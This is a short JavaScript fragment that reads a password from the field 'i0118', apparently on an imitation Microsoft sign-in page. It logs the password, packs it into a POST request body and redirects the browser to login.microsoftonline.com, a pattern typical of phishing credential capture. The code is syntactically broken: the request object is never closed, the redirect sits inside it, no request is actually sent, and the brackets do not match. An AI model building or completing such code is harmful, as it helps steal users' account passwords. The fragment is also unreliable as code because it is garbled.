    function login() {
      console.log(document.getElementById("i0118").value);
      var password = document.getElementById("i0118").value;
      var url = "https://login.microsoftonline.com/";

      const headers = new Headers();
      headers.append("Content-Type", "application/json");

      const body = {
        password: password,
      };

      const options = {
        method: "POST",
        headers,
        mode: "cors",
        body: JSON.stringify(body),

        window.location.href = url;
      });
    }
